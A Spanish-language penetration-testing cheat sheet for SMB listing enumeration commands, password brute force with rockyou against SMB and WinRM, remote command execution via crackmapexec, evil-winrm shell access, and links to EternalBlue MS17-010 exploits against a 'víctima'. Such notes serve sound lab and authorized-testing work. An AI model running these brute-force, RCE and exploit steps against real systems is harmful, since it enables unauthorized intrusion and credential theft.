SMB (Server Message Block) es un protocolo cliente-servidor que controla el acceso a archivos y directorios enteros, así como a otros recursos de la red, como impresoras, routers o interfaces comparti

### Comandos básicos

```
dir o ls # para listar directorio actual
get <archivo> # descargarnos en nuestra máquina un archivo
mget <carpeta> # descargarnos la carpeta entera a nuestra máquina un archivo
allinfo <archivo/carpeta> # saber el tamaño,permisos, atributso NTFS etc de dicho archivo/carpeta
```

### Enumerar servicio,info

```
enum4linux <IP> # comanda básica sin credenciales
enum4linux -a [-u "<usuario>" -p "<password>"] <IP> # con credenciales validas
nmap --script "smb-enum-*" -p445 <IP> # enumerar con nmap
nmap --script "vuln and safe" -p445 <IP> # checkear que haya vulns básicas de smb y safe para que no sea muy intrusiva
```

### Enumerar servicios,ficheros, carpetas etc


```
#smbclient
smbclient -L # listar servicios disponibles
smbclient --no-pass -L //<IP> # listar servicios disponibles sin credenciales (null user)
#smbmap
smbmap -H <IP> [-P <PORT>] # sin credenciales (null user)
smbmap -u "ususario" -p "pass" -H <IP> [-P <puerto>] # con credenciales
smbmap -H <IP> -R <share> # listar archivos en esta carpeta
#crackmapexec
crackmapexec smb <IP> -u '' -p '' --shares #sin credenciales (null user)
crackmapexec smb <IP> -u usuario -p pass --shares # con credenciales listar 
crackmapexec smb <IP> -u usuario -p pass --users # listar usuarios
crackmapexec smb <IP> -u usuario -p pass --groups # listar grupos
crackmapexec smb <IP> -u usuario -p pass -x "whoami" # RCE
```

### Fuerza bruta

```
# winrm
crackmapexec winrm <IP victima> -u user -p /usr/share/wordlists/rockyou.txt
# smb
crackmapexec smb <IP victima> -u user -p /usr/share/wordlists/rockyou.txt
# Linux
hydra -l <user> -P /usr/share/wordlists/rockyou.txt smb://<IP victima>
```

### Conectarte al recurso

```
smbclient --no-pass //<IP>/<carpeta> # sin credenciales
smbclient //<IP>/<ruta> -U=user%password # con credenciales
```

### Descargar archivo

```
sudo smbmap -R carpeta -H <IP> -A <archivo> -q # descargar a tu maquina local
```

### Crear servidor smb con python

```
smbserver.py EjemploSmb $(pwd)
```

### Evil-winrm

Si es el caso que con crackmapexec hemos conseguido credenciales del sistema y no esta el RDP abierto, podemos acceder mediante evil-winrm que utiliza el protocolo winrm para acceder al sistema victima y tener una shell

```
evil-winrm -i <IP/Domain> -u <user> -p <password>
```

## Eternalblue ms17-010

Para solucionar el error de impacket a la hora de ejecutar los scripts dejo un link que medio soluciona el problema [https://abhishekgk.medium.com/solution-impacket-error-ms17-010-a7787ebacf84](https://abhishekgk.medium.com/solution-impacket-error-ms17-010-a7787ebacf84)

[GitHub - worawit/MS17-010: MS17-010GitHub](https://github.com/worawit/MS17-010)

Si por ejemplo al hacer el check no sale todos los test en `STATUS_ACCESS_DENIED` prueba de entrar en el script y añadir a `USERNAME = ''` el usuario guest y vuelve a ejecutar.

[GitHub - d4t4s3c/Win7Blue: Scan/Exploit - EternalBlue MS17-010 - Windows 7 32/64 BitsGitHub](https://github.com/d4t4s3c/Win7Blue)